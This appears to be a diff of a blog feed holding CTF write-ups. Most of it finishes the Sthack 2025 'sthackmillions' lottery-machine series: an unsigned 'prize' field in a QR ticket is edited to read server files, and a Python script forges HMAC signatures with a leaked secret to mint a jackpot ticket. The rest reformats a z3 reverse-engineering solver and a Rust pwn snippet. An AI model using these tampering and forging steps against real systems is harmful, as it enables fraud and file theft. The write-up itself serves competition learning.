+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;data&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;time&#34;</span>: <span style="color:#f1fa8c">&#34;2025-05-23 20:58:11&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;draw&#34;</span>: <span style="color:#f1fa8c">&#34;2025-05-23 21:00&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;numbers&#34;</span>: [<span style="color:#bd93f9">1</span>, <span style="color:#bd93f9">2</span>, <span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">4</span>, <span style="color:#bd93f9">5</span>],
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">&#34;chance&#34;</span>: <span style="color:#bd93f9">1</span>
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;signature&#34;</span>: <span style="color:#f1fa8c">&#34;157e336c88301790fb9058001182257e57fb151f3fdc85492ef0802464827a9e&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">&#34;prize&#34;</span>: <span style="color:#f1fa8c">&#34;flag.txt&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>We have three main fields: <code>data</code>, <code>signature</code>, and <code>prize</code>.</p>
+<p>The fact that <code>prize</code> comes after <code>signature</code> hints that it’s not part of the <em>signed</em> data. This means it could maybe be modified.</p>
+<h2 id="arbitrary-file-read">Arbitrary File Read</h2>
+<p>Let’s predict the next winning numbers, make a grid and get the QR code from the ticket.</p>
+<p>Then, modify the <em>JSON</em> to put <code>app.py</code> in the <code>prize</code> field.</p>
+<p><img src="https://i.ibb.co/ksH4hnMT/IMG-1573.png" alt="afr_qr.png"></p>
+<p>Then scan the QR code on the machine. It should see that we have the right numbers and print out the contents of the file named in <code>prize</code> (<code>app.py</code>).</p>
+<p><img src="https://i.ibb.co/M0NmW7b/IMG-1576.jpg" alt="flag_3.png"></p>
+<p>(The flag is commented at the top of the ticket.)</p>
+<p><img src="https://i.imgflip.com/9vbvm4.jpg" alt="meme"></p>
+<h1 id="44---misc">4/4 - Misc</h1>
+<p>Great! We can now read pretty much any file we want on the server, and we know it’s running a Python <em>Flask</em> architecture.</p>
+<p>If you remember, our goal is to have a ticket with all the numbers correct <strong>and</strong> the bonus number. On the machine, we can only select bonus numbers between 1 and 10, but the draw’s bonus numbers are always above 10.</p>
+<p><img src="https://i.ibb.co/TqKNmCn2/IMG-1582.jpg" alt="draws.png"></p>
+<p>So there’s only one way to get the <em>Jackpot</em>: arbitrarily crafting a QR code with the right numbers.</p>
+<p>To do so, we need to know how the <code>signature</code> field works and the key used. But we can read any file, so that will be pretty trivial.</p>
+<p>Let’s read both <code>.env</code> and <code>sign.py</code> files.</p>
+<p><img src="https://i.ibb.co/rR8Fjyfs/IMG-1581.jpg" alt="secret_key.png"></p>
+<p><img src="https://i.ibb.co/vCcn165M/IMG-1583.jpg" alt="sign.py.png"></p>
+<p>It’s a simple <em>HMAC SHA-256</em> signature on the <code>data</code> field. We have the function and the key used by the machine, so we can generate valid signatures.</p>
+<p>Let’s implement this in a small script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#6272a4">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> hmac<span style="color:#ff79c6">,</span> hashlib<span style="color:#ff79c6">,</span> json<span style="color:#ff79c6">,</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SECRET <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;3c0a8dfe0420367&#34;</span>
+</span></span><span style="display:flex;"><span>PRIZE  <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;flag.txt&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_sign</span>(payload: <span style="color:#8be9fd;font-style:italic">str</span>) <span style="color:#ff79c6">-&gt;</span> <span style="color:#8be9fd;font-style:italic">str</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> hmac<span style="color:#ff79c6">.</span>new(SECRET<span style="color:#ff79c6">.</span>encode(), payload<span style="color:#ff79c6">.</span>encode(),
+</span></span><span style="display:flex;"><span>                    hashlib<span style="color:#ff79c6">.</span>sha256)<span style="color:#ff79c6">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">pack</span>(data) <span style="color:#ff79c6">-&gt;</span> <span style="color:#8be9fd;font-style:italic">str</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">isinstance</span>(data, <span style="color:#8be9fd;font-style:italic">str</span>):
+</span></span><span style="display:flex;"><span>        data <span style="color:#ff79c6">=</span> json<span style="color:#ff79c6">.</span>loads(data)
+</span></span><span style="display:flex;"><span>    inner <span style="color:#ff79c6">=</span> json<span style="color:#ff79c6">.</span>dumps(data, separators<span style="color:#ff79c6">=</span>(<span style="color:#f1fa8c">&#34;, &#34;</span>, <span style="color:#f1fa8c">&#34;: &#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    full <span style="color:#ff79c6">=</span> {<span style="color:#f1fa8c">&#34;data&#34;</span>: inner, <span style="color:#f1fa8c">&#34;signature&#34;</span>: _sign(inner), <span style="color:#f1fa8c">&#34;prize&#34;</span>: PRIZE}
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> json<span style="color:#ff79c6">.</span>dumps(full, separators<span style="color:#ff79c6">=</span>(<span style="color:#f1fa8c">&#34;, &#34;</span>, <span style="color:#f1fa8c">&#34;: &#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">__name__</span> <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    payload <span style="color:#ff79c6">=</span> sys<span style="color:#ff79c6">.</span>stdin<span style="color:#ff79c6">.</span>read()<span style="color:#ff79c6">.</span>strip()
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(pack(payload <span style="color:#ff79c6">if</span> payload <span style="color:#ff79c6">else</span> {}))
+</span></span></code></pre></div><p><img src="https://i.ibb.co/CpkyDS8D/2025-05-27-155234-954x128-scrot.png" alt="script.py.png"></p>
+<p>Now that we have a valid <em>JSON</em> payload that should give us a <em>Jackpot</em>, let’s put it in a QR code and scan it on the machine!</p>
+<p><img src="https://i.ibb.co/Z65Cj0fm/IMG-1587.jpg" alt="final.png"></p>
+<p>It worked, and we got a beautiful check for completing this challenge!</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>This was definitely one of the best challenge series I’ve played. Having a physical machine was a great plus over other challenges, and seeing a whole source code printed on a ticket made my day (or my night, I guess?).</p>
+<p>Thanks to <code>hackdaddy</code> and <code>hessman</code> for creating this series !</p>
+<p><img src="https://i.imgflip.com/9vbw2s.jpg" alt="meme"></p>
+<h4 id="back-to-top"><a href="/posts/2025/05/sthack-2025-sthackmillions/#table-of-contents">back to top</a></h4>
+]]></content>
+        </item>
         
         <item>
             <title>🇫🇷 FCSC 2025 - rev/coloratops</title>
@@ -612,55 +941,55 @@
 </span></span><span style="display:flex;"><span>NB_REG <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">256</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">VMZ3</span>:
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> __init__(self, code: <span style="color:#8be9fd;font-style:italic">bytes</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">__init__</span>(<span style="font-style:italic">self</span>, code: <span style="color:#8be9fd;font-style:italic">bytes</span>):
 </span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(code) <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">3</span>:
 </span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">raise</span> ValueError(<span style="color:#f1fa8c">&#34;Le micro-code doit être un multiple de 3 octets&#34;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>code   <span style="color:#ff79c6">=</span> code
-</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>key    <span style="color:#ff79c6">=</span> [z3<span style="color:#ff79c6">.</span>BitVec(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;k</span><span style="color:#f1fa8c">{</span>i<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">16</span>)]
-</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>reg    <span style="color:#ff79c6">=</span> [z3<span style="color:#ff79c6">.</span>BitVec(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;r</span><span style="color:#f1fa8c">{</span>i<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>, UINT32) <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(NB_REG)]
-</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>solver <span style="color:#ff79c6">=</span> z3<span style="color:#ff79c6">.</span>Solver()
-</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>_build_constraints()
+</span></span><span style="display:flex;"><span>        <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>code   <span style="color:#ff79c6">=</span> code
+</span></span><span style="display:flex;"><span>        <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>key    <span style="color:#ff79c6">=</span> [z3<span style="color:#ff79c6">.</span>BitVec(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;k</span><span style="color:#f1fa8c">{</span>i<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">16</span>)]
+</span></span><span style="display:flex;"><span>        <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>reg    <span style="color:#ff79c6">=</span> [z3<span style="color:#ff79c6">.</span>BitVec(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;r</span><span style="color:#f1fa8c">{</span>i<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>, UINT32) <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(NB_REG)]
+</span></span><span style="display:flex;"><span>        <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>solver <span style="color:#ff79c6">=</span> z3<span style="color:#ff79c6">.</span>Solver()
+</span></span><span style="display:flex;"><span>        <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>_build_constraints()
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># ---------------- VM operations ---------------- #</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_wrap32</span>(self, expr):
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_wrap32</span>(<span style="font-style:italic">self</span>, expr):
 </span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> z3<span style="color:#ff79c6">.</span>Extract(<span style="color:#bd93f9">31</span>, <span style="color:#bd93f9">0</span>, expr)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_ADD</span> (self, d, s): self<span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>_wrap32(self<span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">+</span> self<span style="color:#ff79c6">.</span>reg[s])
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_SUB</span> (self, d, s): self<span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>_wrap32(self<span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">-</span> self<span style="color:#ff79c6">.</span>reg[s])
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_SHL</span> (self, d, imm): self<span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>_wrap32(self<span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">&lt;&lt;</span> imm)
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_SHR</span> (self, d, imm): self<span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">=</span> z3<span style="color:#ff79c6">.</span>LShR(self<span style="color:#ff79c6">.</span>reg[d], imm)
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_MUL</span> (self, d, s): self<span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>_wrap32(self<span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">*</span> self<span style="color:#ff79c6">.</span>reg[s])
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_OR</span>  (self, d, s): self<span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">|</span> self<span style="color:#ff79c6">.</span>reg[s]
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_MOVB</span>(self, d, idx): self<span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">=</span> z3<span style="color:#ff79c6">.</span>ZeroExt(<span style="color:#bd93f9">24</span>, self<span style="color:#ff79c6">.</span>key[idx <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0x0F</span>])
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_ADDI</span>(self, d, imm): self<span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>_wrap32(self<span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">+</span> imm)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_ADD</span> (<span style="font-style:italic">self</span>, d, s): <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">=</span> <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>_wrap32(<span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">+</span> <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>reg[s])
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_SUB</span> (<span style="font-style:italic">self</span>, d, s): <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">=</span> <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>_wrap32(<span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">-</span> <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>reg[s])
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_SHL</span> (<span style="font-style:italic">self</span>, d, imm): <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">=</span> <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>_wrap32(<span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">&lt;&lt;</span> imm)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_SHR</span> (<span style="font-style:italic">self</span>, d, imm): <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">=</span> z3<span style="color:#ff79c6">.</span>LShR(<span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>reg[d], imm)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_MUL</span> (<span style="font-style:italic">self</span>, d, s): <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">=</span> <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>_wrap32(<span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">*</span> <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>reg[s])
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_OR</span>  (<span style="font-style:italic">self</span>, d, s): <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">=</span> <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">|</span> <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>reg[s]
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_MOVB</span>(<span style="font-style:italic">self</span>, d, idx): <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">=</span> z3<span style="color:#ff79c6">.</span>ZeroExt(<span style="color:#bd93f9">24</span>, <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>key[idx <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0x0F</span>])
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_ADDI</span>(<span style="font-style:italic">self</span>, d, imm): <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">=</span> <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>_wrap32(<span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>reg[d] <span style="color:#ff79c6">+</span> imm)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#6272a4"># ---------------- Build full trace ------------- #</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_build_constraints</span>(self):
-</span></span><span style="display:flex;"><span>        it <span style="color:#ff79c6">=</span> struct<span style="color:#ff79c6">.</span>iter_unpack(<span style="color:#f1fa8c">&#34;&lt;BBB&#34;</span>, self<span style="color:#ff79c6">.</span>code)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">_build_constraints</span>(<span style="font-style:italic">self</span>):
+</span></span><span style="display:flex;"><span>        it <span style="color:#ff79c6">=</span> struct<span style="color:#ff79c6">.</span>iter_unpack(<span style="color:#f1fa8c">&#34;&lt;BBB&#34;</span>, <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>code)
 </span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">for</span> op, dst, src <span style="color:#ff79c6">in</span> it:
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span>   op <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x0B</span>: self<span style="color:#ff79c6">.</span>_ADD(dst, src)
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">elif</span> op <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x16</span>: self<span style="color:#ff79c6">.</span>_SUB(dst, src)
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">elif</span> op <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x2C</span>: self<span style="color:#ff79c6">.</span>_SHL(dst, src <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0x1F</span>)
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">elif</span> op <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x37</span>: self<span style="color:#ff79c6">.</span>_SHR(dst, src <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0x1F</span>)
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">elif</span> op <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x42</span>: self<span style="color:#ff79c6">.</span>_MUL(dst, src)
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">elif</span> op <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x4D</span>: self<span style="color:#ff79c6">.</span>_OR (dst, src)
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">elif</span> op <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x58</span>: self<span style="color:#ff79c6">.</span>_MOVB(dst, src)
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">elif</span> op <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x63</span>: self<span style="color:#ff79c6">.</span>_ADDI(dst, src)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span>   op <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x0B</span>: <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>_ADD(dst, src)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">elif</span> op <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x16</span>: <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>_SUB(dst, src)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">elif</span> op <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x2C</span>: <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>_SHL(dst, src <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0x1F</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">elif</span> op <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x37</span>: <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>_SHR(dst, src <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0x1F</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">elif</span> op <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x42</span>: <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>_MUL(dst, src)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">elif</span> op <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x4D</span>: <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>_OR (dst, src)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">elif</span> op <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x58</span>: <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>_MOVB(dst, src)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">elif</span> op <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x63</span>: <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>_ADDI(dst, src)
 </span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">else</span>:
 </span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">raise</span> ValueError(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;Opcode inconnu 0x</span><span style="color:#f1fa8c">{</span>op<span style="color:#f1fa8c">:</span><span style="color:#f1fa8c">02X</span><span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># condition finale r0 == 0</span>
-</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>solver<span style="color:#ff79c6">.</span>add(self<span style="color:#ff79c6">.</span>reg[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>        <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>solver<span style="color:#ff79c6">.</span>add(<span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>reg[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">solve</span>(self):
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> self<span style="color:#ff79c6">.</span>solver<span style="color:#ff79c6">.</span>check() <span style="color:#ff79c6">!=</span> z3<span style="color:#ff79c6">.</span>sat:
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">solve</span>(<span style="font-style:italic">self</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>solver<span style="color:#ff79c6">.</span>check() <span style="color:#ff79c6">!=</span> z3<span style="color:#ff79c6">.</span>sat:
 </span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">raise</span> RuntimeError(<span style="color:#f1fa8c">&#34;Aucune clé trouvée&#34;</span>)
-</span></span><span style="display:flex;"><span>        model <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>solver<span style="color:#ff79c6">.</span>model()
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">bytes</span>(model<span style="color:#ff79c6">.</span>evaluate(k)<span style="color:#ff79c6">.</span>as_long() <span style="color:#ff79c6">for</span> k <span style="color:#ff79c6">in</span> self<span style="color:#ff79c6">.</span>key)
+</span></span><span style="display:flex;"><span>        model <span style="color:#ff79c6">=</span> <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>solver<span style="color:#ff79c6">.</span>model()
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">bytes</span>(model<span style="color:#ff79c6">.</span>evaluate(k)<span style="color:#ff79c6">.</span>as_long() <span style="color:#ff79c6">for</span> k <span style="color:#ff79c6">in</span> <span style="font-style:italic">self</span><span style="color:#ff79c6">.</span>key)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">main</span>():
 </span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(sys<span style="color:#ff79c6">.</span>argv) <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">2</span>:
@@ -672,7 +1001,7 @@
 </span></span><span style="display:flex;"><span>    key <span style="color:#ff79c6">=</span> vm<span style="color:#ff79c6">.</span>solve()
 </span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;Clé trouvée (hex) :&#34;</span>, key<span style="color:#ff79c6">.</span>hex())
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">__name__</span> <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
 </span></span><span style="display:flex;"><span>    main()
 </span></span></code></pre></div><p>Ce script nous donne une clé qui, après traitement par le microcode, satisfait la condition
 <code>R0 == 0</code>.</p>
@@ -1311,28 +1640,28 @@
 <p>We can see that option 4 is our <code>win</code> function:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#bd93f9">4</span> <span style="color:#ff79c6">=&gt;</span> {
 </span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> opened {
-</span></span><span style="display:flex;"><span>        println!(<span style="color:#f1fa8c">&#34;Account balance: </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span>, (<span style="color:#ff79c6">*</span>account).balance);
+</span></span><span style="display:flex;"><span>        <span style="color:#50fa7b">println!</span>(<span style="color:#f1fa8c">&#34;Account balance: </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span>, (<span style="color:#ff79c6">*</span>account).balance);
 </span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">*</span>account).balance <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">1337</span> {
